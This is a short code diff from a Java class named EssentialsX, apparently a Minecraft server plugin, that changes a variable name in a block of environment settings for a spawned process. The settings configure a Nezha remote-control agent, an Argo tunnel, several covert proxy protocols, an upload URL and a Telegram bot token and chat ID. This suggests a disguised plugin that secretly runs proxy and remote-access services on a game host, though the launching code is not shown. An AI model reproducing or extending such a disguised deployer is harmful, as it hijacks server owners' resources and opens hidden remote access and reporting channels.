@@ -86,27 +86,27 @@ public class EssentialsX extends JavaPlugin {
         
         // Set environment variables
         Map<String, String> env = pb.environment();
-        envVars.put("UUID", "fe7431cb-ab1b-4205-a14c-d056f821b383");
-        envVars.put("FILE_PATH", "./world");
-        envVars.put("NEZHA_SERVER", "");
-        envVars.put("NEZHA_PORT", "");
-        envVars.put("NEZHA_KEY", "");
-        envVars.put("ARGO_PORT", "");
-        envVars.put("ARGO_DOMAIN", "");
-        envVars.put("ARGO_AUTH", "");
-        envVars.put("S5_PORT", "");
-        envVars.put("HY2_PORT", "");
-        envVars.put("TUIC_PORT", "");
-        envVars.put("ANYTLS_PORT", "");
-        envVars.put("REALITY_PORT", "");
-        envVars.put("ANYREALITY_PORT", "");
-        envVars.put("UPLOAD_URL", "");
-        envVars.put("CHAT_ID", "");
-        envVars.put("BOT_TOKEN", "");
-        envVars.put("CFIP", "spring.io");
-        envVars.put("CFPORT", "443");
-        envVars.put("NAME", "");
-        envVars.put("DISABLE_ARGO", "false");
+        env.put("UUID", "fe7431cb-ab1b-4205-a14c-d056f821b383");
+        env.put("FILE_PATH", "./world");
+        env.put("NEZHA_SERVER", "");
+        env.put("NEZHA_PORT", "");
+        env.put("NEZHA_KEY", "");
+        env.put("ARGO_PORT", "");
+        env.put("ARGO_DOMAIN", "");
+        env.put("ARGO_AUTH", "");
+        env.put("S5_PORT", "");
+        env.put("HY2_PORT", "");
+        env.put("TUIC_PORT", "");
+        env.put("ANYTLS_PORT", "");
+        env.put("REALITY_PORT", "");
+        env.put("ANYREALITY_PORT", "");
+        env.put("UPLOAD_URL", "");
+        env.put("CHAT_ID", "");
+        env.put("BOT_TOKEN", "");
+        env.put("CFIP", "spring.io");
+        env.put("CFPORT", "443");
+        env.put("NAME", "");
+        env.put("DISABLE_ARGO", "false");
         
         // Load from system environment variables
         for (String var : ALL_ENV_VARS) {
